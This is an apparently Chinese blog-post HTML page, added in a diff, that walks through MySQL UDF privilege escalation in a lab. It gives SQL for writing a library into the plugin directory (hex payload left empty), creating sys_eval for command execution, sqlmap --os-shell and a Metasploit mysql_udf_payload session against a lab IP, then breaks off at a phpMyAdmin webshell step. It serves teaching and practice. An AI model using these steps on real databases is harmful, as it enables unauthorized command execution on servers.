@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-serif-sc@5.0.0/700.css"><link rel="stylesheet" href="/assets/theme.css?v=7e48d4fc"><script defer src="/assets/app.js?v=7e48d4fc"></script>
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/237383456?v=4&size=200"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 参考[CVE\-2012\-2122\(mysql渗透\)](https://rcn3jqf4xs7x.feishu.cn/wiki/XLDew2jOliBzkGkkjXkc7eS3ngb?from=from_copylink)文档，进行mysql渗透
+
+UDF：User Defined Function，用户自定义函数 
+
+UDF的设计初衷是为了实现功能的多样化和方便用户自定义一些操作函数，但在提升便捷 
+
+性的同时，也带来了命令执行利用的可能。">
+<meta property="og:title" content="MySQL UDF提权">
+<meta property="og:description" content="# 参考[CVE\-2012\-2122\(mysql渗透\)](https://rcn3jqf4xs7x.feishu.cn/wiki/XLDew2jOliBzkGkkjXkc7eS3ngb?from=from_copylink)文档，进行mysql渗透
+
+UDF：User Defined Function，用户自定义函数 
+
+UDF的设计初衷是为了实现功能的多样化和方便用户自定义一些操作函数，但在提升便捷 
+
+性的同时，也带来了命令执行利用的可能。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://P7IVESC.github.io/post/MySQL%20UDF-ti-quan.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/237383456?v=4&size=200">
+<title>MySQL UDF提权</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">MySQL UDF提权</h1>
+<div class="title-right">
+    <a href="https://P7IVESC.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/P7IVESC/P7IVESC.github.io/issues/8" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>参考<a href="https://rcn3jqf4xs7x.feishu.cn/wiki/XLDew2jOliBzkGkkjXkc7eS3ngb?from=from_copylink" rel="nofollow">CVE-2012-2122(mysql渗透)</a>文档，进行mysql渗透</h1>
+<p>UDF：User Defined Function，用户自定义函数</p>
+<p>UDF的设计初衷是为了实现功能的多样化和方便用户自定义一些操作函数，但在提升便捷</p>
+<p>性的同时，也带来了命令执行利用的可能。在MySQL中，可以通过创建指向特定库文件</p>
+<p>（Windows中的dll，Linux中的so）的自定义函数，从而实现特定的功能。攻击者利用此特</p>
+<p>点，就可以创建一个能够命令执行的函数。</p>
+<p>利用条件</p>
+<p>• 能够连接到MySQL数据库并执行SQL语句</p>
+<p>• 能够向主机上写入文件 secure_file_priv</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">show global variables <span class="pl-k">like</span> <span class="pl-s"><span class="pl-pds">"</span>secure_file_priv<span class="pl-pds">"</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ecf801fc2bcc932af89c2ecccb4942f5c47769cf388e9649d777d72aad78bc4f/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f4759354f444d34596a677a4d574d334d44426d5a5745334e574a6c4d6d4d794e7a5a694e6a417a4e6d46664e7a4e69595745334d6d51334e6a4d334d444a6d4f5449334e4451304e446c6d5a54686c4e5745354e6a5266535551364e7a59794f5455314d6a55324f5445774d7a6b794f4449344d5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/ecf801fc2bcc932af89c2ecccb4942f5c47769cf388e9649d777d72aad78bc4f/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f4759354f444d34596a677a4d574d334d44426d5a5745334e574a6c4d6d4d794e7a5a694e6a417a4e6d46664e7a4e69595745334d6d51334e6a4d334d444a6d4f5449334e4451304e446c6d5a54686c4e5745354e6a5266535551364e7a59794f5455314d6a55324f5445774d7a6b794f4449344d5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGY5ODM4YjgzMWM3MDBmZWE3NWJlMmMyNzZiNjAzNmFfNzNiYWE3MmQ3NjM3MDJmOTI3NDQ0NDlmZThlNWE5NjRfSUQ6NzYyOTU1MjU2OTEwMzkyODI4MV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p>kali中自带的UDF提权库文件</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /usr/share/metasploit-framework/data/exploits/mysql</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6613d47ef8f06a055471689dc927f05af4d406bc987086060a5051ca27005d9a/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d574e6c4f5756684d7a67335a54457a4e446b795a4756695a5759315a6d5930595441324e54426b5a5746665a5749784d446732595451305a54426a4f44466d593255325a6d4d3159546331593249324d44517a5a546466535551364e7a59794f5455314d7a49354d6a51304d7a55774d7a63354e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/6613d47ef8f06a055471689dc927f05af4d406bc987086060a5051ca27005d9a/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4d574e6c4f5756684d7a67335a54457a4e446b795a4756695a5759315a6d5930595441324e54426b5a5746665a5749784d446732595451305a54426a4f44466d593255325a6d4d3159546331593249324d44517a5a546466535551364e7a59794f5455314d7a49354d6a51304d7a55774d7a63354e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWNlOWVhMzg3ZTEzNDkyZGViZWY1ZmY0YTA2NTBkZWFfZWIxMDg2YTQ0ZTBjODFmY2U2ZmM1YTc1Y2I2MDQzZTdfSUQ6NzYyOTU1MzI5MjQ0MzUwMzc5N18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p>确认MySQL库文件路径</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">show variables <span class="pl-k">like</span> <span class="pl-s"><span class="pl-pds">'</span>%plugin%<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dd83d93fb79de1297c69ac3ad233ea2b4b9a855b40f62f54dd6c6ec30e4c8e23/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d593245305954466d4d474a6d4e6a41774d5756694e475579596a637a4d3251334d44426a5a6a59335a6a46664d474d794d6d49774d5455304d546b794e444d335a546c6c4e6a5a6c4e6a4d7959325a6a595745334e325266535551364e7a59794f5455314d7a55354e4463314e6a59344d446b774f5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/dd83d93fb79de1297c69ac3ad233ea2b4b9a855b40f62f54dd6c6ec30e4c8e23/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d593245305954466d4d474a6d4e6a41774d5756694e475579596a637a4d3251334d44426a5a6a59335a6a46664d474d794d6d49774d5455304d546b794e444d335a546c6c4e6a5a6c4e6a4d7959325a6a595745334e325266535551364e7a59794f5455314d7a55354e4463314e6a59344d446b774f5638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2E0YTFmMGJmNjAwMWViNGUyYjczM2Q3MDBjZjY3ZjFfMGMyMmIwMTU0MTkyNDM3ZTllNjZlNjMyY2ZjYWE3N2RfSUQ6NzYyOTU1MzU5NDc1NjY4MDkwOV8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h1>在MySQL中写入恶意库文件</h1>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> unhex(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>) into dumpfile <span class="pl-s"><span class="pl-pds">'</span>/usr/local/mysql/lib/plugin/udf.so<span class="pl-pds">'</span></span>;</pre></div>
+<p>创建恶意函数，指向特定库文件</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">create</span> <span class="pl-k">function</span> <span class="pl-en">sys_eval</span> returns string SONAME <span class="pl-s"><span class="pl-pds">'</span>udf.so<span class="pl-pds">'</span></span>; </pre></div>
+<p>命令执行</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> sys_eval(<span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>);</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2be8bbe0ac94feeccaf3b9153738697aed04cfb1a1999ec009f5f47e1db82d44/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a5451784f4745324d325a684e6a4e684d7a686b4d474d774e446b334d3259304e6d46694d6d4e6d5a5746665a6a45795a47566b597a646a596a4e694e6d4d7a597a45304e4756685a54597a5a6a4d7759574e6c597a5666535551364e7a59794f5455314e44457a4e54497a4e5445794d4441334d3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/2be8bbe0ac94feeccaf3b9153738697aed04cfb1a1999ec009f5f47e1db82d44/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a5451784f4745324d325a684e6a4e684d7a686b4d474d774e446b334d3259304e6d46694d6d4e6d5a5746665a6a45795a47566b597a646a596a4e694e6d4d7a597a45304e4756685a54597a5a6a4d7759574e6c597a5666535551364e7a59794f5455314e44457a4e54497a4e5445794d4441334d3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTQxOGE2M2ZhNjNhMzhkMGMwNDk3M2Y0NmFiMmNmZWFfZjEyZGVkYzdjYjNiNmMzYzE0NGVhZTYzZjMwYWNlYzVfSUQ6NzYyOTU1NDEzNTIzNTEyMDA3M18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p>检查创建的函数</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> <span class="pl-c1">mysql</span>.<span class="pl-c1">func</span> <span class="pl-k">where</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>sys_eval<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/17cd9d0271dafa1b737c5c095771b21a0aa393161f19d1ed86f27589e7170879/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f4752694f4467344d5749334f4468694d574530595441345a6d4534597a63334d5446685932497a595468664d6a42685a574d324e44466a596a6379596d5178597a4e6b4d5445775a5441774e5751314f5456694d7a6866535551364e7a59794f5455314e4449324e7a45324e6a6b774d7a49314e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/17cd9d0271dafa1b737c5c095771b21a0aa393161f19d1ed86f27589e7170879/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4f4752694f4467344d5749334f4468694d574530595441345a6d4534597a63334d5446685932497a595468664d6a42685a574d324e44466a596a6379596d5178597a4e6b4d5445775a5441774e5751314f5456694d7a6866535551364e7a59794f5455314e4449324e7a45324e6a6b774d7a49314e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGRiODg4MWI3ODhiMWE0YTA4ZmE4Yzc3MTFhY2IzYThfMjBhZWM2NDFjYjcyYmQxYzNkMTEwZTAwNWQ1OTViMzhfSUQ6NzYyOTU1NDI2NzE2NjkwMzI1N18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p>删除函数</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">drop</span> <span class="pl-k">function</span> sys_eval; </pre></div>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> <span class="pl-c1">mysql</span>.<span class="pl-c1">func</span> <span class="pl-k">where</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>sys_eval<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b6a27edd27d910b9836a501900b4f8fd657917804ce941a5547db7623b650875/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a6d59334e7a566a596a68684d44526b5a6a51304e6a4e6a4e54526b4e4441344e47566b5a474a6a5a5756664f4467324d7a41304d7a557a4d544d314e544a695a6d4531595445334d444a6a4e324d32595455774e6d5266535551364e7a59794f5455314e4451344e7a45334e6a59334f444d304e3138784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d"><img src="https://camo.githubusercontent.com/b6a27edd27d910b9836a501900b4f8fd657917804ce941a5547db7623b650875/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a6d59334e7a566a596a68684d44526b5a6a51304e6a4e6a4e54526b4e4441344e47566b5a474a6a5a5756664f4467324d7a41304d7a557a4d544d314e544a695a6d4531595445334d444a6a4e324d32595455774e6d5266535551364e7a59794f5455314e4451344e7a45334e6a59334f444d304e3138784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmY3NzVjYjhhMDRkZjQ0NjNjNTRkNDA4NGVkZGJjZWVfODg2MzA0MzUzMTM1NTJiZmE1YTE3MDJjN2M2YTUwNmRfSUQ6NzYyOTU1NDQ4NzE3NjY3ODM0N18xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM" style="max-width: 100%;"></a></p>
+<h1>使用sqlmap来进行udf提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sqlmap -d <span class="pl-s"><span class="pl-pds">"</span>mysql://root:123456@10.3.4.95:3306/mysql<span class="pl-pds">"</span></span> --os-shell</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/77d1676fa1bf1fb9235e3d3f1b4a552d6f2e889536fcc05d4053f0ca3970040d/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a6a5930596a49314e5459354d44466d5a6a63325a4759355957497a4d6a517a4d6d51774f4759794e545a664d7a6b30597a5979597a6b32595467305a444935596d4d354e7a67344e6a49774d54497a4f574a6d596d4a66535551364e7a59794f5455314e5459784e5467784e4463324e5463344f4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/77d1676fa1bf1fb9235e3d3f1b4a552d6f2e889536fcc05d4053f0ca3970040d/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d5a6a5930596a49314e5459354d44466d5a6a63325a4759355957497a4d6a517a4d6d51774f4759794e545a664d7a6b30597a5979597a6b32595467305a444935596d4d354e7a67344e6a49774d54497a4f574a6d596d4a66535551364e7a59794f5455314e5459784e5467784e4463324e5463344f4638784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjY0YjI1NTY5MDFmZjc2ZGY5YWIzMjQzMmQwOGYyNTZfMzk0YzYyYzk2YTg0ZDI5YmM5Nzg4NjIwMTIzOWJmYmJfSUQ6NzYyOTU1NTYxNTgxNDc2NTc4OF8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h1>使用msf来进行udf提权，但是无回显，需要写入后自行登录执行命令</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">use exploit/multi/mysql/mysql_udf_payload 
+msf exploit(multi/mysql/mysql_udf_payload) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> rhosts 10.3.4.95
+rhosts =<span class="pl-k">&gt;</span> 10.3.4.95
+msf exploit(multi/mysql/mysql_udf_payload) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> password 123456
+password =<span class="pl-k">&gt;</span> 123456
+msf exploit(multi/mysql/mysql_udf_payload) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lhost 192.168.205.48
+lhost =<span class="pl-k">&gt;</span> 192.168.205.48</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/642230cd6a1b28d684c5e0c9d2ca8bf5e37db836bddb6c5cadc5c7ce7b435cf7/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e5751324e324e6c596a646c5a44497a4d5759795a47526b4d5459314e3255325a6a67314f446b304d4442664d6a4a6a4d445530597a63334e4749304e7a526b4f574a684e7a6c6b5a6d45774d5459344d6d4a6a4d7a4666535551364e7a59794f5455314e6a6b354f546b7a4d6a55784d7a497a4e6c38784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d"><img src="https://camo.githubusercontent.com/642230cd6a1b28d684c5e0c9d2ca8bf5e37db836bddb6c5cadc5c7ce7b435cf7/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e5751324e324e6c596a646c5a44497a4d5759795a47526b4d5459314e3255325a6a67314f446b304d4442664d6a4a6a4d445530597a63334e4749304e7a526b4f574a684e7a6c6b5a6d45774d5459344d6d4a6a4d7a4666535551364e7a59794f5455314e6a6b354f546b7a4d6a55784d7a497a4e6c38784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWQ2N2NlYjdlZDIzMWYyZGRkMTY1N2U2Zjg1ODk0MDBfMjJjMDU0Yzc3NGI0NzRkOWJhNzlkZmEwMTY4MmJjMzFfSUQ6NzYyOTU1Njk5OTkzMjUxMzIzNl8xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/08ced746521762129990e586264e5b512023c4d7b8f66c838df7cdf6c5f2da0f/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e446c6c4f444d304d44597a4d7a45794e6a55304d6d453059325a694d544d345a5759794e574e6d4d474a664f4749334e444d324e5752684e7a63784d44457a597a64685a574d335a6a6469597a49324d6d566d4e6a5666535551364e7a59794f5455314e7a45314d44557a4d6a6b7a4d4463344d6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/08ced746521762129990e586264e5b512023c4d7b8f66c838df7cdf6c5f2da0f/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e446c6c4f444d304d44597a4d7a45794e6a55304d6d453059325a694d544d345a5759794e574e6d4d474a664f4749334e444d324e5752684e7a63784d44457a597a64685a574d335a6a6469597a49324d6d566d4e6a5666535551364e7a59794f5455314e7a45314d44557a4d6a6b7a4d4463344d6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDllODM0MDYzMzEyNjU0MmE0Y2ZiMTM4ZWYyNWNmMGJfOGI3NDM2NWRhNzcxMDEzYzdhZWM3ZjdiYzI2MmVmNjVfSUQ6NzYyOTU1NzE1MDUzMjkzMDc4Ml8xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0393e2f5130c765b9bc6a05c0cb8db6b406bca27955a513663ad65e35d85c758/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e5449794d574d35596a4e694e4751304d7a466a597a5930597a6734593259325a4449344d7a64684f544e664d6a41304e6a646b4e574e6b4d444930597a51794e44633059324a6d4d6a64695a475a6d4f54426b4e325a66535551364e7a59794f5455314e7a41354f5451344f4445324f5445304f5638784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d"><img src="https://camo.githubusercontent.com/0393e2f5130c765b9bc6a05c0cb8db6b406bca27955a513663ad65e35d85c758/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d4e5449794d574d35596a4e694e4751304d7a466a597a5930597a6734593259325a4449344d7a64684f544e664d6a41304e6a646b4e574e6b4d444930597a51794e44633059324a6d4d6a64695a475a6d4f54426b4e325a66535551364e7a59794f5455314e7a41354f5451344f4445324f5445304f5638784e7a6b7a4f544d7a4d6a55334f6a45334f5451774d546b324e546466566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTIyMWM5YjNiNGQ0MzFjYzY0Yzg4Y2Y2ZDI4MzdhOTNfMjA0NjdkNWNkMDI0YzQyNDc0Y2JmMjdiZGZmOTBkN2ZfSUQ6NzYyOTU1NzA5OTQ4ODE2OTE0OV8xNzkzOTMzMjU3OjE3OTQwMTk2NTdfVjM" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ba18b92263faa7e9e4ac4899ef8f21f4451d2fd7eb7b52f7c7ca0b8755cadcea/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d593259334d324577597a526a5a6a5a6a4d7a5530597a4a6d597a497a4e7a45324f544e694d6d4a6b593252665a6a51324d324d324f5751354d7a67314f444d784d325a694d6a41304d474e694e7a5531596d566b5a6a4a66535551364e7a59794f5455314e7a51304f4449304f4459314f446b774e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/ba18b92263faa7e9e4ac4899ef8f21f4451d2fd7eb7b52f7c7ca0b8755cadcea/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d593259334d324577597a526a5a6a5a6a4d7a5530597a4a6d597a497a4e7a45324f544e694d6d4a6b593252665a6a51324d324d324f5751354d7a67314f444d784d325a694d6a41304d474e694e7a5531596d566b5a6a4a66535551364e7a59794f5455314e7a51304f4449304f4459314f446b774e3138784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" data-canonical-src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2Y3M2EwYzRjZjZjMzU0YzJmYzIzNzE2OTNiMmJkY2RfZjQ2M2M2OWQ5Mzg1ODMxM2ZiMjA0MGNiNzU1YmVkZjJfSUQ6NzYyOTU1NzQ0ODI0ODY1ODkwN18xNzkzOTMzMjU2OjE3OTQwMTk2NTZfVjM" style="max-width: 100%;"></a></p>
+<h1>PHPMyadmin登录后台后，可以直接执行SQL语句，因此可以尝试直接往web目录下写入webshell</h1>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4b907467c330e216bb34b02209f5f1855b4d57101610d13f49aeceb761903c09/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d596d4d355a6a4978595445774e7a4d354f57526c4d6a67304f44526c4d5449344e574e6a5a6d59784e4756665a4459784d5441794d446b79596a466d4e4456684d6a67794e6a41795a5451354d6a557a4d6a6779596a6466535551364e7a59794f5455314f44517a4f5449794f4455774f544d354e6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d"><img src="https://camo.githubusercontent.com/4b907467c330e216bb34b02209f5f1855b4d57101610d13f49aeceb761903c09/68747470733a2f2f696e7465726e616c2d6170692d64726976652d73747265616d2e6665697368752e636e2f73706163652f6170692f626f782f73747265616d2f646f776e6c6f61642f61757468636f64652f3f636f64653d596d4d355a6a4978595445774e7a4d354f57526c4d6a67304f44526c4d5449344e574e6a5a6d59784e4756665a4459784d5441794d446b79596a466d4e4456684d6a67794e6a41795a5451354d6a557a4d6a6779596a6466535551364e7a59794f5455314f44517a4f5449794f4455774f544d354e6c38784e7a6b7a4f544d7a4d6a55324f6a45334f5451774d546b324e545a66566a4d" alt="Image" 